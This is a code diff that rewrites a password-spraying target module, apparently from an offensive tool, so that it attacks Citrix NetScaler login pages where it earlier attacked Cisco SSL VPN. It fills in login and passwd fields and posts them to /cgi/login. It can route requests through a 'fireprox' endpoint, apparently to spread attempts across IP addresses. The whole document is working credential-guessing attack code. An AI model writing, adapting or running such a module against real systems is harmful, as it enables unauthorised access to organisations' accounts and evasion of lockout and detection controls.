@@ -2,41 +2,36 @@ import requests
 
 from .classes.BaseHttpTarget import BaseHttpTarget
 
+##############################
+# ALPHA CODE - NEEDS TESTING #
+##############################
 
-class Ciscosslvpn(BaseHttpTarget):
+
+class Citrix(BaseHttpTarget):
+    """Password spray Citrix NetScaler"""
+
     def __init__(self, host, port, timeout, fireprox):
-        self.group = input("Enter VPN group: ")
         self.timeout = timeout
-        self.url = f"https://{host}:{port}/+webvpn+/index.html"
+        self.host = host
+        self.url = f"https://{host}:{port}/cgi/login"
 
         if fireprox:
-            self.url = f"https://{fireprox}/fireprox/+webvpn+/index.html"
-
-        self.cookies = {"webvpnlogin": "1", "webvpnLang": "en"}
+            self.url = f"https://{fireprox}/fireprox/cgi/login"
 
         self.headers = {
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.5",
             "Accept-Encoding": "gzip, deflate",
-            "Referer": f"https://{host}/+CSCOE+/logon.html",
-            "Content-Type": "application/x-www-form-urlencoded",
+            # 'Referer': 'https://%s/vpn/index.html' % (host),
             "Connection": "close",
             "Upgrade-Insecure-Requests": "1",
+            "Content-Type": "application/x-www-form-urlencoded",
         }
 
-        self.data = {
-            "tgroup": "",
-            "next": "",
-            "tgcookieset": "",
-            "group_list": "%s" % self.group,
-            "username": "",
-            "password": "",
-            "Login": "Login",
-        }
+        self.data = {"login": "", "passwd": "", "dummy_username": "", "dummy_pass1": ""}
 
     """
-        # proxy settings
         self.http_proxy  = 'http://127.0.0.1:8080'
         self.https_proxy = 'http://127.0.0.1:8080'
         self.ftp_proxy   = 'http://127.0.0.1:8080'
@@ -49,11 +44,11 @@ class Ciscosslvpn(BaseHttpTarget):
     """
 
     def set_username(self, username):
-        self.data["username"] = username
+        self.data["login"] = username
         self.username = username
 
     def set_password(self, password):
-        self.data["password"] = password
+        self.data["passwd"] = password
         self.password = password
 
     def login(self, username, password):
@@ -62,11 +57,6 @@ class Ciscosslvpn(BaseHttpTarget):
         self.set_password(password)
         # post the request
         response = requests.post(
-            self.url,
-            headers=self.headers,
-            cookies=self.cookies,
-            data=self.data,
-            timeout=self.timeout,
-            verify=False,
-        )  # , proxies=self.proxyDict)
+            self.url, headers=self.headers, data=self.data, timeout=self.timeout
+        )  # , verify=False, proxies=self.proxyDict)
         return response
